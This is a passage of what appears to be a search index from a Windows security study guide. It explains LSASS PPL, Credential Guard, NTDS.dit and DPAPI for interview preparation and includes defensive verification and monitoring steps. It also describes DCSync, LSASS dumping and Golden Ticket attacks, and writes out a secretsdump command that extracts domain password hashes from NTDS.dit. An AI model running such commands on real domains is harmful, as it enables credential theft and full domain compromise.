Prior","lvl":3,"t":"Registry Hive Explanation (Interview Question)","c":"Q: Why does it have to be in CurrentControlSet? “Windows maintains multiple Control Sets (usually 3) for redundancy. CurrentControlSet is a symbolic link pointing to the active configuration (usually ControlSet001). During boot, the kernel reads this Control Set to determine system settings. If you modify the wrong Control Set, the changes won’t apply until Windows switches to it.”"},{"id":"verification-is-ppl-enabled","u":"00_things-to-understand-prior.html#verification-is-ppl-enabled","sec":"Things To Understand Prior","lvl":3,"t":"Verification: Is PPL Enabled?","c":""},{"id":"after-reboot-verify","u":"00_things-to-understand-prior.html#after-reboot-verify","sec":"Things To Understand Prior","lvl":3,"t":"After Reboot, Verify:","c":"powershell # Method 1: Check Registry Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" -Name RunAsPPL # Method 2: PowerShell (check LSASS process) Get-Process lsass | Format-List * # Method 3: Check Event Logs for PPL activation Get-EventLog -LogName System -Source \"lsass\" | Select-Object TimeGenerated, Message"},{"id":"visual-confirmation-task-manager","u":"00_things-to-understand-prior.html#visual-confirmation-task-manager","sec":"Things To Understand Prior","lvl":3,"t":"Visual Confirmation (Task Manager):","c":"1. Open Task Manager 2. Find lsass.exe 3. If PPL is active: \"LSASS.EXE\" shows as protected 4. Right-click → Properties → some options are greyed out"},{"id":"important-details-for-interview","u":"00_things-to-understand-prior.html#important-details-for-interview","sec":"Things To Understand Prior","lvl":3,"t":"Important Details for Interview","c":"Aspect | Detail | — | — | Registry Location | HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ | Entry Name | RunAsPPL (case-sensitive in some contexts) | Data Type | REG_DWORD (32-bit integer) | Enable Value | 1 | Disable Value | 0 | Reboot Required? | YES - kernel-level change | Admin Rights? | YES - registry modification | Takes Effect | At next boot |"},{"id":"why-reboot-is-mandatory-deep-dive","u":"00_things-to-understand-prior.html#why-reboot-is-mandatory-deep-dive","sec":"Things To Understand Prior","lvl":3,"t":"Why Reboot is Mandatory (Deep Dive)","c":"LSASS Protection is a KERNEL-LEVEL feature: Registry entry only influences KERNEL decisions during boot ├─ Kernel reads registry early in boot sequence ├─ Decides: \"Is RunAsPPL enabled?\" ├─ If yes → Applies protection to LSASS before it fully loads └─ This happens before any user-mode code executes You CAN'T change kernel-level protection of a running process because: 1. LSASS is already loaded and protected 2. Windows kernel only reads this setting during initialization 3. Changing it mid-session would require stopping LSASS (which would crash the system - can't stop LSASS while Windows is running) 4. Therefore: Reboot is the only safe way"},{"id":"real-scenario-interview-answer","u":"00_things-to-understand-prior.html#real-scenario-interview-answer","sec":"Things To Understand Prior","lvl":3,"t":"Real Scenario (Interview Answer)","c":"Q: I need to enable PPL. What do I do? “I would: Open regedit as Administrator Navigate to HKLM Create a new DWORD entry named RunAsPPL with value 1 Reboot the system After reboot, LSASS runs with PPL protection Verify with Get-ItemProperty command The reboot is required because PPL is a kernel-level protection that’s applied during the boot process, before LSASS fully initializes.”"},{"id":"common-mistakes-dont-do-this","u":"00_things-to-understand-prior.html#common-mistakes-dont-do-this","sec":"Things To Understand Prior","lvl":3,"t":"Common Mistakes (Don’t Do This!)","c":"❌ Creating in wrong location — Wrong Control Set ❌ Wrong data type — String instead of DWORD ❌ Typo in name — RunAsPPL not RunAsProtectedProcess ❌ Forgetting reboot — Change won’t take effect ❌ Without admin rights — Permission denied error"},{"id":"understanding-credentials-guard","u":"00_things-to-understand-prior.html#understanding-credentials-guard","sec":"Things To Understand Prior","lvl":3,"t":"Understanding Credentials Guard","c":""},{"id":"why-credential-guard-was-introduced","u":"00_things-to-understand-prior.html#why-credential-guard-was-introduced","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Why Credential Guard Was Introduced","c":""},{"id":"problem-with-ppl-protected-process-light","u":"00_things-to-understand-prior.html#problem-with-ppl-protected-process-light","sec":"Things To Understand Prior","lvl":3,"t":"Problem with PPL (Protected Process Light)","c":"✅ PPL protects LSASS from: Memory dumping Unauthorized process access Common Mimikatz-style attacks ❌ Limitation: If an attacker gains kernel-level access , PPL protections can often be bypassed. Traditional Windows treats the kernel as the highest privilege boundary."},{"id":"traditional-security-model","u":"00_things-to-understand-prior.html#traditional-security-model","sec":"Things To Understand Prior","lvl":3,"t":"Traditional Security Model","c":"User Mode → Kernel Mode Once an attacker reaches the kernel: They can access almost anything in the OS. LSASS protections become much weaker. Credentials become exposed."},{"id":"microsofts-goal","u":"00_things-to-understand-prior.html#microsofts-goal","sec":"Things To Understand Prior","lvl":3,"t":"Microsoft’s Goal","c":"Create a security boundary where: Compromising LSASS is not enough. Compromising the Windows kernel is not enough. Credentials remain isolated from the normal operating system."},{"id":"what-credential-guard-is","u":"00_things-to-understand-prior.html#what-credential-guard-is","sec":"Things To Understand Prior","lvl":3,"t":"🎯 What Credential Guard Is","c":"Credential Guard is a security feature built on: image.png Virtualization-Based Security (VBS) Hypervisor-enforced isolation Secure Kernel Isolated User Mode (IUM) Purpose: Protect NTLM secrets Protect Kerberos secrets Protect derived credential material Prevent credential dumping from LSASS"},{"id":"traditional-boot-process","u":"00_things-to-understand-prior.html#traditional-boot-process","sec":"Things To Understand Prior","lvl":3,"t":"🔹 Traditional Boot Process","c":"Without VBS:"},{"id":"system-startup","u":"00_things-to-understand-prior.html#system-startup","sec":"Things To Understand Prior","lvl":3,"t":"System Startup","c":"Hardware starts. Windows Kernel loads. LSASS starts. Authentication services start. Result: Windows Kernel is the highest authority. LSASS secrets ultimately depend on kernel security."},{"id":"vbs-boot-process","u":"00_things-to-understand-prior.html#vbs-boot-process","sec":"Things To Understand Prior","lvl":3,"t":"🔹 VBS Boot Process","c":"With VBS enabled:"},{"id":"system-startup-1","u":"00_things-to-understand-prior.html#system-startup-1","sec":"Things To Understand Prior","lvl":3,"t":"System Startup","c":"Hardware starts. Hypervisor loads first. Standard Windows Kernel loads. Secure Kernel loads in an isolated environment. Result: Hypervisor becomes the highest authority. Windows Kernel is no longer the top privilege boundary."},{"id":"virtual-trust-levels-vtls","u":"00_things-to-understand-prior.html#virtual-trust-levels-vtls","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Virtual Trust Levels (VTLs)","c":"Credential Guard separates components into security worlds called:"},{"id":"virtual-trust-levels","u":"00_things-to-understand-prior.html#virtual-trust-levels","sec":"Things To Understand Prior","lvl":3,"t":"Virtual Trust Levels","c":"VTL0 Normal Windows Environment Contains: Windows Kernel (ntoskrnl.exe) Drivers LSASS Applications EDR agents Think: 👉 Everything attackers normally compromise. VTL1 Secure Environment Contains: Secure Kernel (securekernel.exe) Credential Guard components Think: 👉 Protected security world."},{"id":"why-vtl-separation-matters","u":"00_things-to-understand-prior.html#why-vtl-separation-matters","sec":"Things To Understand Prior","lvl":3,"t":"🔥 Why VTL Separation Matters","c":"Suppose attacker obtains: SYSTEM privileges LSASS access Kernel access They still only control: VTL0 They do NOT automatically control: VTL1 To reach VTL1 they would need: Hypervisor compromise Hypervisor escape vulnerability This is significantly harder."},{"id":"secure-kernel","u":"00_things-to-understand-prior.html#secure-kernel","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Secure Kernel","c":"Process:"},{"id":"securekernel.exe","u":"00_things-to-understand-prior.html#securekernel.exe","sec":"Things To Understand Prior","lvl":3,"t":"securekernel.exe","c":"Runs inside: VTL1 Responsibilities: Secure cryptographic operations Credential isolation Secret protection Managing secure services Think: 👉 Security kernel separate from normal Windows."},{"id":"isolated-user-mode-ium","u":"00_things-to-understand-prior.html#isolated-user-mode-ium","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Isolated User Mode (IUM)","c":"The Secure Kernel has a user-mode companion called: Isolated User Mode (IUM) Purpose: Host highly sensitive applications. Keep them separated from normal Windows. Applications running inside IUM are called: Trustlets"},{"id":"what-are-trustlets","u":"00_things-to-understand-prior.html#what-are-trustlets","sec":"Things To Understand Prior","lvl":3,"t":"🎯 What Are Trustlets?","c":"Trustlets are security-sensitive applications running inside the isolated environment. Characteristics: ✅ Run inside protected memory ✅ Separate from Windows user-mode ✅ Protected by Secure Kernel ✅ Must be Microsoft signed"},{"id":"important-restriction","u":"00_things-to-understand-prior.html#important-restriction","sec":"Things To Understand Prior","lvl":3,"t":"Important Restriction","c":"A trustlet can only load if: Signed by Microsoft Trusted by the Secure Kernel Result: ❌ Attackers cannot simply load custom code into IUM. ❌ Attackers cannot load arbitrary DLLs."},{"id":"credential-guard-trustlet","u":"00_things-to-understand-prior.html#credential-guard-trustlet","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Credential Guard Trustlet","c":"Credential Guard uses a special trustlet: lsaiso.exe Known as: Isolated LSA Think: 👉 Protected version of authentication services."},{"id":"isolated-lsa-responsibilities","u":"00_things-to-understand-prior.html#isolated-lsa-responsibilities","sec":"Things To Understand Prior","lvl":3,"t":"Isolated LSA Responsibilities","c":"Handles: NTLM support Kerberos support Authentication-related operations Credential processing Purpose: Keep secrets away from LSASS memory."},{"id":"communication-methods","u":"00_things-to-understand-prior.html#communication-methods","sec":"Things To Understand Prior","lvl":3,"t":"Communication Methods","c":"lsaiso.exe communicates through: ALPC Advanced Local Procedure Call Used for: Local secure communication. RPC Remote Procedure Call Used for: Service communication."},{"id":"architecture-summary","u":"00_things-to-understand-prior.html#architecture-summary","sec":"Things To Understand Prior","lvl":3,"t":"Architecture Summary","c":"Normal World (VTL0) Contains: LSASS Applications Windows Kernel Secure World (VTL1) Contains: Secure Kernel lsaiso.exe Credential Guard trustlets Communication occurs through controlled interfaces."},{"id":"critical-system-process","u":"00_things-to-understand-prior.html#critical-system-process","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Critical System Process","c":"lsaiso.exe is considered:"},{"id":"critical-system-process-1","u":"00_things-to-understand-prior.html#critical-system-process-1","sec":"Things To Understand Prior","lvl":3,"t":"Critical System Process","c":"Consequences: ❌ Cannot stop it ❌ Cannot restart it ❌ Cannot kill it If terminated: 👉 Windows crashes (BSOD)"},{"id":"one-time-context-handles","u":"00_things-to-understand-prior.html#one-time-context-handles","sec":"Things To Understand Prior","lvl":3,"t":"🎯 One-Time Context Handles","c":"NTLM and Kerberos interfaces expose: Initialization Functions These functions return: Context Handles Think: 👉 Secure references allowing communication with isolated authentication services."},{"id":"important-security-design","u":"00_things-to-understand-prior.html#important-security-design","sec":"Things To Understand Prior","lvl":3,"t":"Important Security Design","c":"These initialization functions: ✅ Can only be called once ✅ Are executed during boot ✅ Are called by LSASS After boot: ❌ Other applications cannot obtain these handles."},{"id":"why-this-matters","u":"00_things-to-understand-prior.html#why-this-matters","sec":"Things To Understand Prior","lvl":3,"t":"Why This Matters","c":"Attackers cannot simply: Open a handle Talk to Credential Guard Request secrets Because the required handles already belong to LSASS."},{"id":"cryptography-protection","u":"00_things-to-understand-prior.html#cryptography-protection","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Cryptography Protection","c":"The Isolated LSA does not directly protect secrets itself. Instead it asks: Secure Kernel to perform cryptographic operations. Secure Kernel Functions Used functions: EncryptData Encrypt sensitive data. DecryptData Decrypt sensitive data. Session Key Protection These functions rely on: Per-Session Key Characteristics: ✅ Randomly generated ✅ Created every Secure Kernel initialization ✅ Different after reboot"},{"id":"security-benefit","u":"00_things-to-understand-prior.html#security-benefit","sec":"Things To Understand Prior","lvl":3,"t":"Security Benefit","c":"Even if encrypted credential blobs are stolen: Keys are isolated. Keys change every boot. Decryption requires Secure Kernel cooperation."},{"id":"kerberosium-and-ntlmium","u":"00_things-to-understand-prior.html#kerberosium-and-ntlmium","sec":"Things To Understand Prior","lvl":3,"t":"🎯 KerberosIum and NtlmIum","c":"Credential Guard exposes: KerberosIum Handles Kerberos operations. NtlmIum Handles NTLM operations. Meaning of “Ium”: Isolated User Mode"},{"id":"what-changed-compared-to-old-lsass","u":"00_things-to-understand-prior.html#what-changed-compared-to-old-lsass","sec":"Things To Understand Prior","lvl":3,"t":"What Changed Compared To Old LSASS?","c":"Before Credential Guard: LSASS stored: NTLM hashes Kerberos keys Derived credentials often in recoverable form. With Credential Guard: LSASS stores: Encrypted blobs instead of usable credential material."},{"id":"key-concept","u":"00_things-to-understand-prior.html#key-concept","sec":"Things To Understand Prior","lvl":3,"t":"Key Concept","c":"LSASS no longer owns the secrets. Instead: lsaiso.exe + Secure Kernel own the secrets."},{"id":"kerberos-example","u":"00_things-to-understand-prior.html#kerberos-example","sec":"Things To Understand Prior","lvl":3,"t":"Kerberos Example","c":"Suppose LSASS needs: AP-REQ Authenticator Normally: LSASS would create it itself. With Credential Guard: LSASS asks KerberosIum. KerberosIum performs the operation. Secret keys never leave the isolated environment."},{"id":"why-traditional-credential-dumping-fails","u":"00_things-to-understand-prior.html#why-traditional-credential-dumping-fails","sec":"Things To Understand Prior","lvl":3,"t":"Why Traditional Credential Dumping Fails","c":"Previously: Dump LSASS → Recover NTLM hashes → Recover Kerberos keys → Recover tickets With Credential Guard: Dump LSASS Only reveals: Encrypted blobs Protected structures Not usable secrets."},{"id":"what-would-an-attacker-need-to-do","u":"00_things-to-understand-prior.html#what-would-an-attacker-need-to-do","sec":"Things To Understand Prior","lvl":3,"t":"🎯 What Would An Attacker Need To Do?","c":"To directly interact with isolated secrets: Option 1 Inject code into: lsass.exe Option 2 Load custom Security Support Providers (SSPs) Then: Obtain context handles Talk to Credential Guard interfaces Request operations"},{"id":"why-is-this-difficult","u":"00_things-to-understand-prior.html#why-is-this-difficult","sec":"Things To Understand Prior","lvl":3,"t":"Why Is This Difficult?","c":"EDR Problem Modern EDRs heavily monitor: LSASS access Memory injection Handle operations Result: 🚨 High detection risk. PPL Problem If LSASS runs as PPL: Code injection becomes much harder. Process manipulation becomes restricted. Trustlet Problem Custom security packages would require: Trusted signatures Approved loading Attackers cannot simply load arbitrary code."},{"id":"final-interview-summary","u":"00_things-to-understand-prior.html#final-interview-summary","sec":"Things To Understand Prior","lvl":3,"t":"🔥 Final Interview Summary","c":"PPL Protects: LSASS process Weakness: Kernel compromise may bypass it. Credential Guard Protects: Actual credential material Uses: Hypervisor VBS Secure Kernel Isolated LSA (lsaiso.exe) Main Security Idea Before: Secrets stored inside LSASS After: Secrets stored in an isolated environment outside LSASS"},{"id":"why-credential-guard-is-powerful","u":"00_things-to-understand-prior.html#why-credential-guard-is-powerful","sec":"Things To Understand Prior","lvl":3,"t":"Why Credential Guard Is Powerful","c":"Even if an attacker gains: ✅ Administrator ✅ SYSTEM ✅ LSASS dump ✅ Kernel access (VTL0) They still cannot directly obtain: NTLM secrets Kerberos secrets Authentication keys because those secrets live behind: Hypervisor → VTL1 → Secure Kernel → lsaiso.exe ."},{"id":"how-to-verify-if-credential-guard-is-enabled-or-disabled","u":"00_things-to-understand-prior.html#how-to-verify-if-credential-guard-is-enabled-or-disabled","sec":"Things To Understand Prior","lvl":3,"t":"How to verify if Credential Guard is enabled or disabled","c":"You can use one of the below methods to check the status of Windows Credential Guard on a single PC."},{"id":"method-1-using-system-information","u":"00_things-to-understand-prior.html#method-1-using-system-information","sec":"Things To Understand Prior","lvl":3,"t":"Method 1: Using System Information","c":"Right-click on the Start button and select Run Enter msinfo32 in the Run dialog and click OK Click on System Summary in the left navigation panel In the right panel, scroll down to Virtualization-based Security Services Configured Credential Guard will be listed in the Value field for Virtualization-based Security Services Configured if it is enabled If Windows Credential Guard is disabled or not available on your system, it will not appear."},{"id":"method-2-using-group-policy-editor","u":"00_things-to-understand-prior.html#method-2-using-group-policy-editor","sec":"Things To Understand Prior","lvl":3,"t":"Method 2: Using Group Policy Editor","c":"You can also use the Group Policy Editor to check the enforcement status of Windows Credential Guard: Right-click on the Start button and select Run Enter gpedit.msc and click OK to open the Group Policy Editor Navigate to Computer Configuration/Administrative Templates/System/Device Guard Locate the Turn On Virtualization-based Security policy and open it If the policy is Enabled, you can check the options to see whether it’s enforced with UEFI (preventing it from being disabled) or not If the policy is set to Not Configured , Credential Guard is not enforced by Group Policy (but still may be enabled by default)"},{"id":"method-3-checking-the-windows-event-viewer","u":"00_things-to-understand-prior.html#method-3-checking-the-windows-event-viewer","sec":"Things To Understand Prior","lvl":3,"t":"Method 3: Checking the Windows Event Viewer","c":"The Windows Event Viewer can be used to see information logged by Credential Guard. Search for and open Event Viewer from the Start menu Locate the Windows Credential Guard logs at Applications and Services Logs/Microsoft/Windows > DeviceGuard Open the Operational log You can then verify that Credential Guard is working by inspecting the log entries. If there are no logs present, Device Guard may not be supported or enabled on your system. To aid in visualizing the verification process, you may view this video: ‘ How to Verify if Device Guard is Enabled or Disabled in Windows ’."},{"id":"method-4-using-powershell-commands","u":"00_things-to-understand-prior.html#method-4-using-powershell-commands","sec":"Things To Understand Prior","lvl":3,"t":"Method 4: Using PowerShell commands","c":"The Get-CimInstance PowerShell cmdlet can be used to check whether or not Credential Guard is enabled or disabled by following these steps: Open PowerShell as Administrator Run the following PowerShell command bool .SecurityServicesRunning.Contains(2) If this command returns True , Credential Guard is active Pro Tip: If you want a more detailed breakdown without the True/False logic, simply run: Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard Look at the SecurityServicesRunning property. If it includes the number 2 , Credential Guard is active."},{"id":"ntds.dit","u":"00_things-to-understand-prior.html#ntds.dit","sec":"Things To Understand Prior","lvl":2,"t":"NTDS.dit","c":""},{"id":"understanding-the-core-concept-2","u":"00_things-to-understand-prior.html#understanding-the-core-concept-2","sec":"Things To Understand Prior","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"introduction","u":"00_things-to-understand-prior.html#introduction","sec":"Things To Understand Prior","lvl":3,"t":"📘 Introduction","c":"Active Directory (AD) is a directory service for Windows domain networks, commonly used in enterprise environments. It centralizes authentication, authorization, and management of computers and users."},{"id":"why-target-ad","u":"00_things-to-understand-prior.html#why-target-ad","sec":"Things To Understand Prior","lvl":3,"t":"🔎 Why Target AD?","c":"AD is often the heart of an enterprise network . Credentials stored in AD, especially in the NTDS.dit database, are valuable to attackers. Gaining access to AD can lead to full domain compromise . image.png"},{"id":"windows-authentication-after-domain-join","u":"00_things-to-understand-prior.html#windows-authentication-after-domain-join","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Windows Authentication After Domain Join","c":"Once a Windows machine joins a domain: It stops using the local SAM database for domain account authentication. All authentication requests are sent to a Domain Controller (DC) . Local accounts can still log in using: hostname\\username .\\username (on logon screen) Key components: lsass.exe : Local Security Authority Subsystem Service Authentication packages: NTLM, Kerberos AD DS (Active Directory Domain Services)"},{"id":"what-is-ntds.dit-at-its-core","u":"00_things-to-understand-prior.html#what-is-ntds.dit-at-its-core","sec":"Things To Understand Prior","lvl":3,"t":"🧠 What is NTDS.dit (At Its Core)","c":"NTDS.dit is the Active Directory database used by Domain Controllers (DCs) . Think of it as: 🗄️ The master identity database of the entire domain It stores: All domain users All computers All groups All password hashes Kerberos-related secrets If you compromise NTDS.dit → you own the domain ."},{"id":"where-is-ntds.dit-stored","u":"00_things-to-understand-prior.html#where-is-ntds.dit-stored","sec":"Things To Understand Prior","lvl":3,"t":"📍 Where is NTDS.dit Stored?","c":"Default path on a Domain Controller: C:\\Windows\\NTDS\\NTDS.dit ⚠️ You cannot copy it while Windows is running because: It’s locked Actively used by lsass.exe"},{"id":"internal-structure-of-ntds.dit","u":"00_things-to-understand-prior.html#internal-structure-of-ntds.dit","sec":"Things To Understand Prior","lvl":3,"t":"🧱 Internal Structure of NTDS.dit","c":"NTDS.dit is an ESE database (Extensible Storage Engine). Major Tables Inside Table | Purpose | — | — | datatable | User/computer objects | link_table | Group memberships | sd_table | Security Descriptors (ACLs) | hiddentable | Metadata | quota_table | AD quotas | The most valuable data lives in datatable ."},{"id":"what-secrets-are-stored-inside","u":"00_things-to-understand-prior.html#what-secrets-are-stored-inside","sec":"Things To Understand Prior","lvl":3,"t":"🔑 What Secrets Are Stored Inside?","c":"1️⃣ User Password Hashes Each user has: Type | Meaning | — | — | NTLM hash | Used for NTLM auth | LM hash | Legacy (usually disabled) | Stored as: unicodePwd → encrypted → NT hash 🔐 Passwords are never stored in plaintext . 2️⃣ Kerberos Secrets a) Kerberos Long-Term Keys Used for: AS-REQ / AS-REP TGT creation Includes: AES256 AES128 RC4 (NT hash) b) krbtgt Account Hash ⭐ This is the most critical secret . Used to sign all Kerberos tickets Compromise = Golden Ticket attacks Allows forged tickets forever (until reset twice) 3️⃣ Cached Credentials (for DC) Machine account hashes Trust relationship secrets Inter-domain trust keys"},{"id":"why-system-security-hive-is-required","u":"00_things-to-understand-prior.html#why-system-security-hive-is-required","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Why SYSTEM + SECURITY Hive Is Required","c":"NTDS.dit alone is useless . You also need: C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY"},{"id":"why","u":"00_things-to-understand-prior.html#why","sec":"Things To Understand Prior","lvl":4,"t":"Why?","c":"Because: Hashes in NTDS.dit are encrypted The BootKey is stored in the SYSTEM hive Decryption flow: SYSTEM hive → BootKey BootKey → decrypt PEK PEK → decrypt password hashes Without SYSTEM → hashes stay encrypted."},{"id":"authentication-flow-where-ntds.dit-is-used","u":"00_things-to-understand-prior.html#authentication-flow-where-ntds.dit-is-used","sec":"Things To Understand Prior","lvl":3,"t":"🧪 Authentication Flow (Where NTDS.dit Is Used)","c":"NTLM Authentication User → NT hash LSASS → compares hash NTDS.dit → stores reference hash Kerberos Authentication User → AS-REQ KDC (on DC) → reads NTDS.dit krbtgt key → signs TGT So: Every domain login"},{"id":"every-kerberos-ticket","u":"00_things-to-understand-prior.html#every-kerberos-ticket","sec":"Things To Understand Prior","lvl":4,"t":"Every Kerberos ticket","c":"→ touches NTDS.dit"},{"id":"how-attackers-access-ntds.dit","u":"00_things-to-understand-prior.html#how-attackers-access-ntds.dit","sec":"Things To Understand Prior","lvl":3,"t":"🧨 How Attackers Access NTDS.dit","c":""},{"id":"offline-disk-access","u":"00_things-to-understand-prior.html#offline-disk-access","sec":"Things To Understand Prior","lvl":4,"t":"1️⃣ Offline (Disk Access)","c":"Examples: DC backup Shadow Copy Disk snapshot Mounted VHD Classic methods: Volume Shadow Copy IFM backup NTDSUTIL No LSASS interaction → stealthier"},{"id":"online-memory-replication","u":"00_things-to-understand-prior.html#online-memory-replication","sec":"Things To Understand Prior","lvl":4,"t":"2️⃣ Online (Memory / Replication)","c":"a) DCSync Attack ⭐ Abuses Directory Replication privileges : ReplicatingDirectoryChanges ReplicatingDirectoryChangesAll Effect: DC sends password hashes No file access No NTDS.dit touching This logically equals dumping NTDS.dit ."},{"id":"b-lsass-dump-dc","u":"00_things-to-understand-prior.html#b-lsass-dump-dc","sec":"Things To Understand Prior","lvl":4,"t":"b) LSASS Dump (DC)","c":"If you dump LSASS on a DC: NTDS secrets are accessible Extremely noisy Often detected"},{"id":"tools-that-parse-ntds.dit-conceptual","u":"00_things-to-understand-prior.html#tools-that-parse-ntds.dit-conceptual","sec":"Things To Understand Prior","lvl":3,"t":"🧰 Tools That Parse NTDS.dit (Conceptual)","c":"Tool | Purpose | — | — | secretsdump | Extract hashes | ntdsutil | Legit backup | DSInternals | Defensive auditing | esentutl | Database handling | These tools: Parse ESE format Decrypt using SYSTEM hive Output hashes + Kerberos keys"},{"id":"what-attackers-do-with-extracted-data","u":"00_things-to-understand-prior.html#what-attackers-do-with-extracted-data","sec":"Things To Understand Prior","lvl":3,"t":"🧬 What Attackers Do With Extracted Data","c":""},{"id":"pass-the-hash-pth","u":"00_things-to-understand-prior.html#pass-the-hash-pth","sec":"Things To Understand Prior","lvl":4,"t":"1️⃣ Pass-the-Hash (PtH)","c":"NT hash → authenticate No password needed"},{"id":"pass-the-ticket-ptt","u":"00_things-to-understand-prior.html#pass-the-ticket-ptt","sec":"Things To Understand Prior","lvl":4,"t":"2️⃣ Pass-the-Ticket (PtT)","c":"Reuse Kerberos tickets"},{"id":"golden-ticket","u":"00_things-to-understand-prior.html#golden-ticket","sec":"Things To Understand Prior","lvl":4,"t":"3️⃣ Golden Ticket","c":"Using krbtgt hash Unlimited persistence"},{"id":"silver-ticket","u":"00_things-to-understand-prior.html#silver-ticket","sec":"Things To Understand Prior","lvl":4,"t":"4️⃣ Silver Ticket","c":"Service-specific forgery"},{"id":"defensive-view-very-important","u":"00_things-to-understand-prior.html#defensive-view-very-important","sec":"Things To Understand Prior","lvl":3,"t":"🛡️ Defensive View (Very Important)","c":""},{"id":"how-to-protect-ntds.dit","u":"00_things-to-understand-prior.html#how-to-protect-ntds.dit","sec":"Things To Understand Prior","lvl":4,"t":"How to Protect NTDS.dit","c":"🔹 Restrict Replication Rights Only Domain Controllers should have: ReplicatingDirectory Changes 🔹 Monitor DCSync Event IDs: 4662 4742 4624 (DC replication patterns) 🔹 Protect SYSTEM Hive Prevent DC backup abuse Secure VSS access 🔹 Reset krbtgt Properly Reset twice With delay between resets"},{"id":"mental-model-easy-recall","u":"00_things-to-understand-prior.html#mental-model-easy-recall","sec":"Things To Understand Prior","lvl":3,"t":"🧠 Mental Model (Easy Recall)","c":"NTDS.dit = Identity Vault SYSTEM hive = DecryptionKey krbtgt = Domain MasterKey DCSync = Remote NTDS extraction"},{"id":"final-summary","u":"00_things-to-understand-prior.html#final-summary","sec":"Things To Understand Prior","lvl":3,"t":"🔚 Final Summary","c":"Aspect | Meaning | — | — | NTDS.dit | AD database | Contains | Hashes, Kerberos keys, users | Needs | SYSTEM hive to decrypt | Crown jewel | krbtgt hash | Worst attack | DCSync | Impact | Full domain compromise |"},{"id":"why-this-matters-1","u":"00_things-to-understand-prior.html#why-this-matters-1","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Why This Matters","c":"The NTDS.dit file contains: All usernames and password hashes . AD schema and domain configuration. Credentials for privileged accounts . Once exfiltrated, it can be cracked using tools like: secretsdump.py hashcat / john"},{"id":"dumping-techniques","u":"00_things-to-understand-prior.html#dumping-techniques","sec":"Things To Understand Prior","lvl":3,"t":"📌 Dumping Techniques:","c":"Volume shadow copy (VSS) Impacket tools (secretsdump.py) Mimikatz Ntdsutil + DSInternals"},{"id":"example-with-impacket","u":"00_things-to-understand-prior.html#example-with-impacket","sec":"Things To Understand Prior","lvl":3,"t":"🔄 Example with Impacket:","c":"bash secretsdump.py -just-dc -system SYSTEM -ntds ntds.dit LOCAL"},{"id":"what-you-get","u":"00_things-to-understand-prior.html#what-you-get","sec":"Things To Understand Prior","lvl":4,"t":"💡 What You Get:","c":"NTLM hashes RID, username Useful for Pass-the-Hash or offline cracking"},{"id":"key-takeaways","u":"00_things-to-understand-prior.html#key-takeaways","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Key Takeaways","c":"Attack Stage | Description | — | — | Username discovery | Using OSINT, email formats, scripts | Wordlist crafting | Based on naming conventions | Dictionary attack | CrackMapExec + SMB | Hash dumping | Post-exploitation on DC using tools | Use of hashes | Pass-the-Hash, offline cracking |"},{"id":"summary","u":"00_things-to-understand-prior.html#summary","sec":"Things To Understand Prior","lvl":3,"t":"📘 Summary","c":"AD is central to Windows enterprise security. Usernames can be harvested via OSINT techniques. Dictionary attacks are useful but noisy and must be used wisely. Dumping NTDS.dit gives attackers access to entire domain credentials . Post-exploitation access to a DC unlocks full potential for hash dumping and lateral movement."},{"id":"dpapi-credential-manager","u":"00_things-to-understand-prior.html#dpapi-credential-manager","sec":"Things To Understand Prior","lvl":2,"t":"Dpapi ( Credential Manager )","c":""},{"id":"understanding-the-core-concept-3","u":"00_things-to-understand-prior.html#understanding-the-core-concept-3","sec":"Things To Understand Prior","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"why-dpapi-exists","u":"00_things-to-understand-prior.html#why-dpapi-exists","sec":"Things To Understand Prior","lvl":3,"t":"🟦 1. Why DPAPI Exists","c":"DPAPI = Data Protection API Purpose: Encrypt user-specific secrets so only that specific user account can decrypt them. It protects: Browser saved passwords (Chrome, Edge, Brave → Login Data) Windows Credentials (Credential Manager) Wi-Fi passwords RDP saved passwords Cloud tokens (Outlook, OneDrive) App secrets (VPN clients, Git clients) MS Office credentials DPAPI-encrypted certificates GPG passphrases Password vault entries"},{"id":"dpapi-user-bound-encryption-system","u":"00_things-to-understand-prior.html#dpapi-user-bound-encryption-system","sec":"Things To Understand Prior","lvl":4,"t":"DPAPI = user-bound encryption system","c":"If you steal the file alone → useless You need: The user’s password or The user’s DPAPI MasterKeys To decrypt."},{"id":"where-dpapi-stores-data","u":"00_things-to-understand-prior.html#where-dpapi-stores-data","sec":"Things To Understand Prior","lvl":3,"t":"🟦 2. Where DPAPI Stores Data","c":"DPAPI has 2 main storage locations:"},{"id":"cusername","u":"00_things-to-understand-prior.html#cusername","sec":"Things To Understand Prior","lvl":4,"t":"**🟥 2.1 C:<UserName>*","c":"This folder stores: Credential Blobs Files with long, random hex-like names (e.g., 3C9A1F6D... ). These represent encrypted entries from Windows Credential Manager. You see these when running: cmdkey /list rundll32.exe keymgr.dll,KRShowKeyMgr Each file contains: DPAPI header Encrypted password/token Metadata These files are called: ✔ CredBlobs"},{"id":"c","u":"00_things-to-understand-prior.html#c","sec":"Things To Understand Prior","lvl":4,"t":"🟦 2.2 C:","c":"Inside this folder: You will see 1 or 2 random folders → These contain: ✔ DPAPI MasterKeys The REAL keying material used to decrypt Credential Blobs and other DPAPI items. These files look like: C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\\ 3c02f7d4-a84f-4e3f-a00e-6a4a31fb0798 9bf1d01a-62f9-4dd4-aa6c-e37519b90877 Each file is a MasterKey file ."},{"id":"why-there-are-two-random-folders-in-protect","u":"00_things-to-understand-prior.html#why-there-are-two-random-folders-in-protect","sec":"Things To Understand Prior","lvl":4,"t":"🟦 3. Why There Are “Two Random Folders” in Protect","c":"Inside: 